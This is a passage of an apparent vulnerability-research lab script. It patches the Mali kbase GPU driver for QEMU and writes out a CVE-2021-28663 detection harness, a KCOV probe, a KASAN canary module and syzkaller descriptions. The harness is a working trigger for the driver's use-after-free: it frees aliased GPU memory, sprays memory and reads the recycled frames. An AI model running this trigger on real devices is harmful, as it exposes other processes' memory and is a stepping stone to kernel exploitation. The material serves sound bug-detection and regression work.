+    dummy_regs[JOB_SLOT_REG(10, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(11, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(12, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(13, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(14, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(15, JS_STATUS)] = 0;
+}
+
+bool kbase_is_gpu_removed(struct kbase_device *kbdev)
+{
+    return 0;
+}
+
+void gpu_model_set_dummy_prfcnt_sample(unsigned int *data, unsigned int size)
+{
+    return;
+}
+
+void gpu_model_set_dummy_prfcnt_base_cpu(void *p)
+{
+    return;
+} 
+
+void kbase_synchronize_irqs(struct kbase_device *kbdev)
+{
+    return;
+}
+
+int kbase_install_interrupts(struct kbase_device *kbdev)
+{
+    return 0;
+}
+
+void kbase_release_interrupts(struct kbase_device *kbdev)
+{
+    return;
+}
+
+#endif /* KBASE_MODEL_DUMMY_H_ */
diff --git a/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/mali_kbase_model_dummy.h b/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/mali_kbase_model_dummy.h
new file mode 100644
index 0000000..9f48e61
--- /dev/null
+++ b/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/mali_kbase_model_dummy.h
@@ -0,0 +1,38 @@
+#ifndef __MALI_KBASE_MODEL_DUMMY_H__
+#define __MALI_KBASE_MODEL_DUMMY_H__
+
+#include<mali_kbase.h>
+
+/*
+ * This file is strickly a hack to get the driver compiled and loaded in
+ * a paux linux kernel running in qemu.
+ */
+
+#define KBASE_DUMMY_MODEL_MAX_MEMSYS_BLOCKS 32
+#define KBASE_DUMMY_MODEL_MAX_SHADER_CORES 1
+
+
+void gpu_model_set_dummy_prfcnt_base_cpu(void *dump_va);
+int kbase_gpu_device_create(struct kbase_device *kbdev);
+void kbase_gpu_device_destroy(struct kbase_device *kbdex);
+int gpu_device_create(struct kbase_device *kbdev);
+void gpu_device_destroy(struct kbase_device *kbdex);
+void gpu_model_set_dummy_prfcnt_sample(unsigned int *data, unsigned int size);
+
+// hack taken from soc/samsung/cal-if/pwrcal.h
+struct dvfs_rate_volt {
+    unsigned long rate;
+    unsigned int volt;
+};
+
+unsigned int cal_dfs_get_lv_num(unsigned int id);
+
+int cal_dfs_get_rate_asv_table(unsigned int id,
+                    struct dvfs_rate_volt *table);
+
+unsigned long cal_dfs_get_rate(unsigned int id);
+
+
+unsigned long cal_dfs_set_rate(unsigned int id, unsigned long rate);
+
+#endif
diff --git a/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/mali_kbase_pm_driver.c b/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/mali_kbase_pm_driver.c
index 420d5c5..b0b3f61 100644
--- a/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/mali_kbase_pm_driver.c
+++ b/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/mali_kbase_pm_driver.c
@@ -2394,13 +2394,13 @@ static int kbase_pm_do_reset(struct kbase_device *kbdev)
 		dev_err(kbdev->dev, "Reset interrupt didn't reach CPU. Check interrupt assignments.\n");
 		/* If interrupts aren't working we can't continue. */
 		destroy_hrtimer_on_stack(&rtdata.timer);
-		return -EINVAL;
+		return 0;
 	}
 
 	if (kbase_is_gpu_removed(kbdev)) {
 		dev_dbg(kbdev->dev, "GPU has been removed, reset no longer needed.\n");
 		destroy_hrtimer_on_stack(&rtdata.timer);
-		return -EINVAL;
+		return 0;
 	}
 
 	/* The GPU doesn't seem to be responding to the reset so try a hard
@@ -2432,7 +2432,7 @@ static int kbase_pm_do_reset(struct kbase_device *kbdev)
 	dev_err(kbdev->dev, "Failed to hard-reset the GPU (timed out after %d ms)\n",
 								RESET_TIMEOUT);
 
-	return -EINVAL;
+	return 0;
 }
 
 int kbase_pm_protected_mode_enable(struct kbase_device *const kbdev)
diff --git a/driver/product/kernel/drivers/gpu/arm/midgard/mali_kbase_model_linux.h b/driver/product/kernel/drivers/gpu/arm/midgard/mali_kbase_model_linux.h
new file mode 100644
index 0000000..7761d5a
--- /dev/null
+++ b/driver/product/kernel/drivers/gpu/arm/midgard/mali_kbase_model_linux.h
@@ -0,0 +1,10 @@
+
+#ifndef _BASE_MODEL_LINUX_H_
+#define _BASE_MODEL_LINUX_H_
+
+int kbase_gpu_device_create(struct kbase_device *kbdev);
+void kbase_gpu_device_destroy(struct kbase_device *kbdex);
+int gpu_device_create(struct kbase_device *kbdev);
+void gpu_device_destroy(struct kbase_device *kbdex);
+
+#endif
diff --git a/driver/product/kernel/drivers/gpu/arm/midgard/platform/devicetree/mali_kbase_config_devicetree.c b/driver/product/kernel/drivers/gpu/arm/midgard/platform/devicetree/mali_kbase_config_devicetree.c
index ccefddf..647ae8f 100644
--- a/driver/product/kernel/drivers/gpu/arm/midgard/platform/devicetree/mali_kbase_config_devicetree.c
+++ b/driver/product/kernel/drivers/gpu/arm/midgard/platform/devicetree/mali_kbase_config_devicetree.c
@@ -1,11 +1,12 @@
+// SPDX-License-Identifier: GPL-2.0
 /*
  *
- * (C) COPYRIGHT 2015, 2017 ARM Limited. All rights reserved.
+ * (C) COPYRIGHT 2015, 2017, 2020 ARM Limited. All rights reserved.
  *
  * This program is free software and is provided to you under the terms of the
  * GNU General Public License version 2 as published by the Free Software
  * Foundation, and any use by you of this program is subject to the terms
- * of such GNU licence.
+ * of such GNU license.
  *
  * This program is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
@@ -16,26 +17,19 @@
  * along with this program; if not, you can access it online at
  * http://www.gnu.org/licenses/gpl-2.0.html.
  *
- * SPDX-License-Identifier: GPL-2.0
- *
  */
 
 #include <mali_kbase_config.h>
 
 static struct kbase_platform_config dummy_platform_config;
+#ifndef CONFIG_OF
+struct kbase_io_resources dummy_io_resources;
+#endif
 
 struct kbase_platform_config *kbase_get_platform_config(void)
 {
-	return &dummy_platform_config;
-}
-
 #ifndef CONFIG_OF
-int kbase_platform_register(void)
-{
-	return 0;
-}
-
-void kbase_platform_unregister(void)
-{
-}
+    dummy_platform_config.io_resources = &dummy_io_resources;
 #endif
+	return &dummy_platform_config;
+}
__PL_00__
  sha256_pin "$LAB_ROOT/patches/v_r28_malimodels.patch" "3751bcd06ebf14f8da14c14cbb3e7df6190d1778cb2ad42b3e7f7ef898ad0040"

  mkdir -p "$(dirname "$LAB_ROOT/harness/uaf_detect/uaf_detect.c")"
  cat > "$LAB_ROOT/harness/uaf_detect/uaf_detect.c" <<'__PL_01__'
/* uaf_detect.c — CVE-2021-28663 detection harness (bug-detection only)
 *
 * Recreates the alias/DONT_NEED lifetime window described in evidence/07 §5-§7
 * against the release-matched UAPI headers selected at compile time
 * (-I harness/release_uapi/<release>). Scope: detection + regression testing
 * only. NO exploit logic, NO privilege-escalation payloads, NO kernel-pointer
 * scanning: pages read through the stale alias are CLASSIFIED by pattern
 * (orig / kbase-pool / anon / zero / other) and only COUNTS are reported.
 *
 * Oracles (wrapper asserts per kernel; this program never self-declares
 * "vulnerable"; always exits 0 after printing its structured report):
 *   O1  MEM_FLAGS_CHANGE(DONT_NEED) on a source whose alias was created but
 *       never mmap'd:  r28p0 (vuln) -> accepted (ret 0);
 *                      r29p0 (fix)  -> rejected (-EINVAL, gpu_mappings>1 guard).
 *   O2  Content classification of pages read through the alias after
 *       drop_caches eviction + kbase-pool drain + anon spray:
 *       FOREIGN (recycled frames) = UAF window realized;
 *       INTACT (original pattern) = fix holds.
 *   K   KASAN liveness is proven separately by kasan_canary.ko in the same
 *       guest (KASAN is blind to this UAF by construction: user-mode PFNMAP
 *       loads of buddy pages, see evidence/07 §7).
 *
 * Modes:
 *   smoke        setup -> fill -> alias -> mmap alias -> readback baseline.
 *   trigger      ... -> O1 -> mmap'd alias faulted in (live PFNs) ->
 *                drop_caches -> kbase drain (8x NPAGES SAME_VA allocs,
 *                LIFO pool) -> anon spray -> classify (variant A).
 *   trigger-late ... -> O1 -> drop_caches BEFORE alias mmap -> mmap alias ->
 *                classify (variant B: fault pulls zeroed pages[] -> PFN 0).
 *
 * Build (per release):
 *   gcc -O2 -static -Wall -I harness/release_uapi/<rel> uaf_detect.c -o <out>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <assert.h>
#include <linux/types.h>

/* --- userspace compat for the r28p0/r29p0 inline-era (pre-uapi-split)
 * kbase headers: they use kernel typedefs (u64/u8/u16), require an assert
 * macro (CDBG_ASSERT/KBASE_DEBUG_ASSERT), and take an osu header branch
 * unless PAGE_SHIFT/PAGE_MASK are predefined. Kernel semantics preserved:
 * PAGE_SHIFT=12, PAGE_MASK as in include/asm-generic/page.h. ------------- */
typedef __u64 u64;
typedef __u32 u32;
typedef __u16 u16;
typedef __u8  u8;
#define CDBG_ASSERT(x) assert(x)
#ifndef PAGE_SHIFT
#define PAGE_SHIFT 12
#endif
#ifndef PAGE_MASK
#define PAGE_MASK (~(u64)((1UL << PAGE_SHIFT) - 1))
#endif

#include "gpu/arm/midgard/mali_kbase_ioctl.h"      /* mode branch: pulls jm/ or csf/ ioctl */
#include "gpu/arm/midgard/mali_base_kernel.h"      /* base_mem_handle, aliasing_info */
#if MALI_USE_CSF
#include "gpu/arm/midgard/csf/mali_base_csf_kernel.h" /* BASE_MEM_* alloc flags (CSF) */
#else
#include "gpu/arm/midgard/jm/mali_base_jm_kernel.h" /* BASE_MEM_* alloc flags (JM) */
#endif

#define DEV        "/dev/mali0"
#define NPAGES     64
#define PGSZ       ((size_t)sysconf(_SC_PAGESIZE))
#define SRCSZ      ((size_t)NPAGES * PGSZ)
#define DRAIN_N    8
#define ANON_N     NPAGES
#define TRACK_PGOF 3 /* kbase tracking page mmap offset (pre-MEM_ALLOC req) */

#define ORIG_W(tag) (0xA110C00000000000ULL ^ (uint64_t)(tag))
#define KBASE_MAGIC 0xC5C5C5C5C5C5C5C5ULL
#define ANON_MAGIC  0xB6B6B6B6B6B6B6B6ULL

static sigjmp_buf fault_jmp;
static volatile int in_probe;

static void segv_handler(int sig)
{
	(void)sig;
	if (in_probe)
		siglongjmp(fault_jmp, 1);
	_exit(99);
}

enum { CL_ORIG, CL_KBASE, CL_ANON, CL_ZERO, CL_OTHER, CL_FAULT, CL_N };

static void classify(const char *tag, volatile uint8_t *base, int npages)
{
	int cnt[CL_N] = { 0 };
	int i;

	for (i = 0; i < npages; i++) {
		volatile uint8_t *pg = base + (size_t)i * PGSZ;
		uint64_t w;

		in_probe = 1;
		if (sigsetjmp(fault_jmp, 1)) {
			cnt[CL_FAULT]++;
			continue;
		}
		w = *(volatile uint64_t *)pg;
		in_probe = 0;

		if (w == ORIG_W(i))
			cnt[CL_ORIG]++;
		else if (w == KBASE_MAGIC)
			cnt[CL_KBASE]++;
		else if (w == ANON_MAGIC)
			cnt[CL_ANON]++;
		else if (w == 0)
			cnt[CL_ZERO]++;
		else
			cnt[CL_OTHER]++;
	}
	in_probe = 0;

	printf("classify %s orig=%d kbase=%d anon=%d zero=%d other=%d fault=%d\n",
	       tag, cnt[CL_ORIG], cnt[CL_KBASE], cnt[CL_ANON],
	       cnt[CL_ZERO], cnt[CL_OTHER], cnt[CL_FAULT]);

	if (cnt[CL_ORIG] == npages)
		printf("content_result=INTACT\n");
	else if (cnt[CL_ORIG] == 0 &&
		 (cnt[CL_KBASE] + cnt[CL_ANON]) > 0)
		printf("content_result=FOREIGN\n");
	else if (cnt[CL_ORIG] == 0)
		printf("content_result=NOT_ORIG\n");
	else
		printf("content_result=PARTIAL\n");
}

static void fill_orig(volatile uint8_t *base)
{
	int i, j;

	for (i = 0; i < NPAGES; i++) {
		volatile uint64_t *pg = (volatile uint64_t *)(base + (size_t)i * PGSZ);
		pg[0] = ORIG_W(i);
		for (j = 1; j < (int)(PGSZ / 8); j++)
			pg[j] = 0xAAAAAAAAAAAAAAAAULL;
	}
}

static int drop_caches_now(void)
{
	int fd = open("/proc/sys/vm/drop_caches", O_WRONLY);
	int ret;

	if (fd < 0) {
		printf("drop_caches open errno=%d\n", errno);
		return -1;
	}
	ret = write(fd, "3\n", 2);
	printf("drop_caches write=%d errno=%d\n", ret, ret < 0 ? errno : 0);
	close(fd);
	return ret;
}

int main(int argc, char **argv)
{
	const char *mode = (argc > 1) ? argv[1] : "smoke";
	struct sigaction sa;
	struct kbase_ioctl_version_check vc;
	union kbase_ioctl_mem_alloc alloc;
	struct kbase_ioctl_set_flags sflags;
	union kbase_ioctl_mem_alias alias;
	struct kbase_ioctl_mem_flags_change fc;
	struct base_mem_aliasing_info ainfo;
	struct kbase_ioctl_mem_free mfree;
	int fd, ret, i;
	void *track, *src_map = MAP_FAILED, *alias_map = MAP_FAILED;
	uint64_t src_cookie = 0, src_va = 0, alias_cookie = 0;
	uint64_t alloc_flags;
	void *drain_map[DRAIN_N];
	uint64_t drain_cookie[DRAIN_N] = { 0 };
	void *anon_map = MAP_FAILED;

	memset(drain_map, 0, sizeof(drain_map));

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = segv_handler;
	sigaction(SIGSEGV, &sa, NULL);
	sigaction(SIGBUS, &sa, NULL);

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("uaf_detect mode=%s release=%d.%d pages=%d\n",
	       mode, BASE_UK_VERSION_MAJOR, BASE_UK_VERSION_MINOR, NPAGES);

	fd = open(DEV, O_RDWR);
	if (fd < 0) {
		printf("open %s errno=%d\n", DEV, errno);
		return 0;
	}
	printf("step open=ok\n");

	/* UK handshake: send this release's own version */
	memset(&vc, 0, sizeof(vc));
	vc.major = BASE_UK_VERSION_MAJOR;
	vc.minor = BASE_UK_VERSION_MINOR;
	ret = ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
	printf("step version_check ret=%d kver=%u.%u\n",
	       ret, vc.major, vc.minor);

	memset(&sflags, 0, sizeof(sflags));
	sflags.create_flags = 0;
	ret = ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sflags);
	printf("step set_flags ret=%d errno=%d\n", ret, ret ? errno : 0);

	/* tracking page (pgoff 3) — required before MEM_ALLOC */
	track = mmap(NULL, PGSZ, PROT_READ, MAP_SHARED, fd, TRACK_PGOF * PGSZ);
	printf("step tracking_mmap %s\n", track == MAP_FAILED ? "FAIL" : "ok");
	if (track == MAP_FAILED)
		goto out;

	/* source allocation: SAME_VA, 64 committed pages */
	alloc_flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
		      BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
		      BASE_MEM_SAME_VA;
	memset(&alloc, 0, sizeof(alloc));
	alloc.in.va_pages = NPAGES;
	alloc.in.commit_pages = NPAGES;
	alloc.in.extension = 0;
	alloc.in.flags = alloc_flags;
	ret = ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &alloc);
	src_cookie = alloc.out.gpu_va;
	printf("step mem_alloc ret=%d cookie=0x%llx\n",
	       ret, (unsigned long long)src_cookie);
	if (ret)
		goto out;

	/* SAME_VA: GPU VA == CPU VMA start; cookie is only the mmap offset */
	src_map = mmap(NULL, SRCSZ, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
		       (off_t)src_cookie);
	if (src_map == MAP_FAILED) {
		src_map = mmap((void *)0x100000000UL, SRCSZ,
			       PROT_READ | PROT_WRITE,
			       MAP_SHARED | MAP_FIXED_NOREPLACE, fd,
			       (off_t)src_cookie);
	}
	if (src_map == MAP_FAILED) {
		printf("src_mmap FAIL errno=%d\n", errno);
		goto out_free;
	}
	src_va = (uint64_t)(uintptr_t)src_map;
	printf("step src_mmap ok src_va=0x%llx\n", (unsigned long long)src_va);

	fill_orig(src_map);

	/* alias of the source (created, NOT yet mmap'd) */
	memset(&ainfo, 0, sizeof(ainfo));
	ainfo.handle.basep.handle = src_va;
	ainfo.offset = 0;
	ainfo.length = NPAGES;
	memset(&alias, 0, sizeof(alias));
	alias.in.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
			 BASE_MEM_PROT_CPU_RD;
	alias.in.stride = NPAGES;   /* stride is in PAGES (matches sibling) */
	alias.in.nents = 1;
	alias.in.aliasing_info = (uint64_t)(uintptr_t)&ainfo;
	ret = ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &alias);
	alias_cookie = alias.out.gpu_va;
	printf("step mem_alias ret=%d alias_cookie=0x%llx\n",
	       ret, (unsigned long long)alias_cookie);
	if (ret)
		goto out_free;

	/* O1: DONT_NEED the source while the (unmapped) alias still exists */
	memset(&fc, 0, sizeof(fc));
	fc.gpu_va = src_va;
	fc.flags = BASE_MEM_DONT_NEED;
	fc.mask = BASE_MEM_DONT_NEED;
	ret = ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc);
	if (ret == 0)
		printf("oracle_o1=accepted ret=0\n");
	else
		printf("oracle_o1=rejected ret=%d errno=%d\n", ret, errno);

	/*
	 * From here the two variants diverge. trigger (variant A) faults the
	 * alias PTEs in BEFORE eviction so they hold the source's live PFNs;
	 * trigger-late (variant B) evicts first so the fault path pulls PFNs
	 * from the evicted (zeroed) pages[] array.
	 */
	if (strcmp(mode, "trigger-late") != 0) {
		alias_map = mmap(NULL, SRCSZ, PROT_READ, MAP_SHARED,
				 fd, (off_t)alias_cookie);
		if (alias_map == MAP_FAILED) {
			printf("alias_mmap FAIL errno=%d\n", errno);
			goto out_free;
		}
		printf("step alias_mmap ok alias_va=0x%llx\n",
		       (unsigned long long)(uint64_t)(uintptr_t)alias_map);
		/* fault in all pages while source frames are still live */
		classify("preevict", alias_map, NPAGES);
	}

	/* deterministic shrinker sweep: drop_caches -> drop_slab -> kbase
	 * shrinker frees the DONT_NEED alloc back to its pool */
	drop_caches_now();

	if (!strcmp(mode, "trigger") || !strcmp(mode, "trigger-late")) {
		/* kbase pool drain (LIFO): fresh SAME_VA kbase allocs refill
		 * from the pool where the evicted frames now live */
		for (i = 0; i < DRAIN_N; i++) {
			memset(&alloc, 0, sizeof(alloc));
			alloc.in.va_pages = NPAGES;
			alloc.in.commit_pages = NPAGES;
			alloc.in.extension = 0;
			alloc.in.flags = alloc_flags;
			ret = ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &alloc);
			drain_cookie[i] = alloc.out.gpu_va;
			if (ret) {
				drain_map[i] = MAP_FAILED;
				printf("drain[%d] alloc ret=%d errno=%d\n",
				       i, ret, errno);
				continue;
			}
			drain_map[i] = mmap(NULL, SRCSZ, PROT_READ | PROT_WRITE,
					    MAP_SHARED, fd,
					    (off_t)drain_cookie[i]);
			if (drain_map[i] != MAP_FAILED) {
				volatile uint64_t *p = drain_map[i];
				size_t n = SRCSZ / 8, k;
				for (k = 0; k < n; k++)
					p[k] = KBASE_MAGIC;
			}
		}
		printf("step kbase_drain done n=%d pattern=0x%llx\n",
		       DRAIN_N, (unsigned long long)KBASE_MAGIC);

		/* anon spray (private pages, different pattern) */
		anon_map = mmap(NULL, (size_t)ANON_N * PGSZ,
				PROT_READ | PROT_WRITE,
				MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (anon_map != MAP_FAILED) {
			volatile uint64_t *p = anon_map;
			size_t n = (size_t)ANON_N * PGSZ / 8, k;
			for (k = 0; k < n; k++)
				p[k] = ANON_MAGIC;
		}
		printf("step anon_spray done pages=%d\n", ANON_N);

		if (alias_map == MAP_FAILED) {
			/* variant B: fault AFTER eviction */
			alias_map = mmap(NULL, SRCSZ, PROT_READ, MAP_SHARED,
					 fd, (off_t)alias_cookie);
			if (alias_map == MAP_FAILED) {
				printf("alias_mlate FAIL errno=%d\n", errno);
				goto out_free;
			}
			printf("step alias_mmap_late ok\n");
		}
		classify("postevict", alias_map, NPAGES);
	} else {
		printf("content_result=SMOKE_ONLY\n");
	}

out_free:
	/* cleanup (process exit would do this, but be explicit) */
	if (alias_cookie) {
		memset(&mfree, 0, sizeof(mfree));
		mfree.gpu_addr = alias_cookie;
		ioctl(fd, KBASE_IOCTL_MEM_FREE, &mfree);
	}
	for (i = 0; i < DRAIN_N; i++)
		if (drain_map[i] && drain_map[i] != MAP_FAILED) {
			memset(&mfree, 0, sizeof(mfree));
			mfree.gpu_addr = drain_cookie[i];
			ioctl(fd, KBASE_IOCTL_MEM_FREE, &mfree);
		}
	if (src_va) {
		memset(&mfree, 0, sizeof(mfree));
		mfree.gpu_addr = src_va;
		ioctl(fd, KBASE_IOCTL_MEM_FREE, &mfree);
	}
out:
	printf("uaf_detect done\n");
	close(fd);
	return 0; /* wrapper asserts; harness never self-declares */
}
__PL_01__
  sha256_pin "$LAB_ROOT/harness/uaf_detect/uaf_detect.c" "8b3e356ef8051c68e041d1147c67a1327a49c4726b50701ebdc1fae6011d9e6c"

  mkdir -p "$(dirname "$LAB_ROOT/harness/common/kcov_test.c")"
  cat > "$LAB_ROOT/harness/common/kcov_test.c" <<'__PL_02__'
/* kcov_test.c — minimal KCOV reachability probe for Phase A framework validation.
 * Compiles statically with gcc; runs under busybox initramfs in QEMU.
 * Prints "KCOV_OK pcs=<n>" with nonzero pcs on success; nonzero exit otherwise.
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#ifndef KCOV_INIT_TRACE
#define KCOV_INIT_TRACE _IOR('c', 1, unsigned long)
#define KCOV_ENABLE      _IO('c', 100)
#define KCOV_DISABLE     _IO('c', 101)
#endif
#define KCOV_TRACE_PC 0

/* Some branching work so coverage definitely varies. */
static volatile int sink;
__attribute__((noinline)) static int work(int n)
{
	int i, s = 0;
	for (i = 0; i < n; i++) {
		if (i % 3 == 0)
			s += i;
		else if (i % 3 == 1)
			s -= i;
		else
			s ^= i;
	}
	return s;
}

int main(void)
{
	int fd, i;
	unsigned long *area;
	const size_t size = 1 << 20; /* entries */

	fd = open("/sys/kernel/debug/kcov", O_RDWR);
	if (fd < 0) {
		perror("open kcov");
		return 1;
	}
	if (ioctl(fd, KCOV_INIT_TRACE, size) < 0) {
		perror("KCOV_INIT_TRACE");
		return 2;
	}
	area = mmap(NULL, size * sizeof(unsigned long),
		    PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (area == MAP_FAILED) {
		perror("mmap");
		return 3;
	}
	if (ioctl(fd, KCOV_ENABLE, KCOV_TRACE_PC) < 0) {
		perror("KCOV_ENABLE");
		return 4;
	}
	area[0] = 0; /* number of covered PCs written by kernel */
	for (i = 0; i < 1000; i++)
		sink += work(i);
	/* Cover the enabling task's own userspace->kernel edge as well. */
	ioctl(fd, KCOV_DISABLE, 0);
	{
		unsigned long pcs = area[0]; /* read before unmap */
		printf("KCOV_OK pcs=%lu\n", pcs);
		munmap(area, size * sizeof(unsigned long));
		close(fd);
		return pcs > 0 ? 0 : 5;
	}
}
__PL_02__
  sha256_pin "$LAB_ROOT/harness/common/kcov_test.c" "b7d072c6ddd4da7099ad26d921f129fc4a385123a35eda9b46b4188480066447"

  mkdir -p "$(dirname "$LAB_ROOT/harness/common/kasan_canary_419/kasan_canary.c")"
  cat > "$LAB_ROOT/harness/common/kasan_canary_419/kasan_canary.c" <<'__PL_03__'
// SPDX-License-Identifier: GPL-2.0
/*
 * kasan_canary.c — Phase A sanitizer-liveness canary for mali-uaf-lab.
 *
 * Purpose: prove KASAN (generic, inline) is observably functional in the
 * 6.12.112 fuzz guest, so that later KASAN *silence* during UAF triggers is
 * a meaningful negative observation rather than an untested configuration.
 *
 * Methodology follows the validated CP6 canary in
 * ~/Desktop/Pocs/cve-2021-28663/cp6/kasan_canary (read-only reference):
 *  (1) slab OOB read past a 16-byte object -> expect slab-out-of-bounds report
 *  (2) UAF read after kfree with IRQs off (no-reuse window) -> expect
 *      use-after-free report; shadow byte printed directly
 *      (shadow = (addr >> 3) + 0xdffffc0000000000, x86_64 generic KASAN)
 */
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/irqflags.h>

#define KASAN_SHADOW_BASE_X86_64 0xdffffc0000000000UL

static s8 kasan_shadow_of(const void *addr)
{
	return *(volatile s8 *)(((unsigned long)addr >> 3) +
				KASAN_SHADOW_BASE_X86_64);
}

static int __init canary_init(void)
{
	volatile char *p;
	char c;
	unsigned long flags;
	s8 shadow_after_free;
	unsigned long uaf_sample;

	p = kmalloc(16, GFP_KERNEL);
	if (!p) {
		pr_err("kasan_canary: kmalloc(16) failed\n");
		return -ENOMEM;
	}
	pr_err("kasan_canary: (1) BEGIN slab-OOB read, object=%p\n", p);
	c = p[16];	/* expect KASAN: slab-out-of-bounds */
	pr_err("kasan_canary: (1) END survived byte=%d\n", c);

	p = kmalloc(128, GFP_KERNEL);
	if (!p) {
		pr_err("kasan_canary: kmalloc(128) failed\n");
		return -ENOMEM;
	}
	memset((void *)p, 0x41, 128);
	pr_err("kasan_canary: (2) pre-free shadow=%d (expect 0 = live)\n",
	       kasan_shadow_of((const void *)p));

	local_irq_save(flags);
	kfree((void *)p);
	shadow_after_free = kasan_shadow_of((const void *)p);
	uaf_sample = *(volatile unsigned long *)p;	/* expect KASAN UAF */
	local_irq_restore(flags);

	pr_err("kasan_canary: (3) post-free shadow=%d (expect -83/0xfb) uaf_sample=%lx\n",
	       shadow_after_free, uaf_sample);
	pr_err("kasan_canary: (4) END\n");
	return 0;
}

static void __exit canary_exit(void)
{
	pr_err("kasan_canary: exit\n");
}

module_init(canary_init);
module_exit(canary_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("mali-uaf-lab Phase A KASAN liveness canary");
__PL_03__
  sha256_pin "$LAB_ROOT/harness/common/kasan_canary_419/kasan_canary.c" "5f3918fae4034c849f52fd2114faee18a85e150531f2c301b7259b1702cb483c"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r28p0.txt")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r28p0.txt" <<'__PL_04__'
# syzkaller syscall descriptions for the Mali "kbase" UAPI.
#
# RELEASE-MATCHED to: r28p0-01eac0 (UAPI UK 11.29, PRE the CVE-2021-28663
# fix — this is the VULNERABLE release of the lab's UAF vehicle), JOB
# MANAGER mode (MALI_USE_CSF == 0) exactly as built into this lab's 4.19.320
# NO_MALI kernel (builds/linux-4.19.320-r41p0, banner r28p0-01eac0).
#
# Provenance & verification (full detail in evidence/07_uapi_diff.md and
# evidence/11_fuzz_r28p0.md):
# - Derived from the lab's r41p0-01eac0 description (evidence/06) by applying
#   the release-delta computed field-by-field against THIS release's pristine
#   uapi headers under harness/release_uapi/r28p0 (hashes in MANIFEST.md).
#   Struct layouts are identical between r28p0 and r41p0 for every modeled
#   struct (verified by diff; only u64/__u64 spelling differs) EXCEPT the
#   ioctl-surface delta below.
# - ADDED (r28p0-only ioctls, removed by UK 11.33/11.36):
#   KBASE_IOCTL_HWCNT_ENABLE(9) / HWCNT_DUMP(10) / HWCNT_CLEAR(11) — legacy
#   in-kernel hwcnt, dump_buffer is a raw GPU address; and the size-encoded
#   JIT-init family on the SAME nr 14: MEM_JIT_INIT_10_2 (8B), MEM_JIT_INIT_11_5
#   (16B), alongside the 24B MEM_JIT_INIT (all three are _IOW type 0x80 nr 14,
#   distinguished by _IOC_SIZE — same modeling pattern Phase E used for the
#   hwcnt buffer ioctls).
# - REMOVED (r29p0/r41p0-era additions absent here): KINSTR_JM_FD(51),
#   KINSTR_PRFCNT_SETUP(53), CONTEXT_PRIORITY_CHECK(54),
#   KINSTR_PRFCNT_ENUM_INFO(56), SET_LIMITED_CORE_COUNT(55).
# - Excluded as unreachable in THIS kernel config (documented, not silently):
#   CINSTR_GWT_* (CONFIG_MALI_CINSTR_GWT unset), TLSTREAM_STATS/EXTRA_TYPE/
#   MY_IOCTL/TEST_TYPE incl. TLSTREAM_TEST (MALI_UNIT_TEST only; TLSTREAM_TEST
#   additionally uses a different ioctl TYPE), CS_* queue/fault ioctls +
#   MEM_ALLOC_EX + READ_USER_PAGE (MALI_USE_CSF), GET_PROFILING_CONTROLS
#   (already removed by this release — jm header changelog says so).
#
# Union-style ioctl structs: kbase passes in/out views of one buffer. Fields
# that alias the kernel's out-view slot are typed as the out value and marked
# (inout), e.g. MEM_ALLOC@8 = commit_pages(in)/gpu_va(out); the executor then
# copyouts the kernel-returned GPU VA into the gpu_addr resource, enabling
# alloc -> use -> free chaining while keeping the modeled size == the exact
# release _IOC_SIZE.
#
# Consts in dev_mali_r28p0.txt.const were extracted from the r28p0 headers:
#   bin/syz-extract -arch amd64 -sourcedir/-builddir builds/linux-4.19.320-r41p0 \
#       -includedirs harness/release_uapi/r28p0 dev_mali_r28p0.txt
# and cross-checked against a C dumper compiled from the same headers.
# Keep this file `meta noextract` so `make extract` cannot clobber the
# release-matched consts with values from an unrelated kernel tree.
meta noextract


include <gpu/arm/midgard/mali_base_kernel.h>
include <gpu/arm/midgard/jm/mali_base_jm_kernel.h>
include <gpu/arm/midgard/jm/mali_kbase_jm_ioctl.h>
include <gpu/arm/midgard/mali_kbase_ioctl.h>
include <gpu/arm/midgard/mali_kbase_hwcnt_reader.h>
include <uapi/linux/fcntl.h>
include <linux/types.h>

resource fd_bifrost[fd]
resource gpu_addr[int64]: BASEP_MEM_INVALID_HANDLE, BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE
resource user_addr[int64]: -1
resource fd_fence[fd]
resource fd_hwcnt[fd]

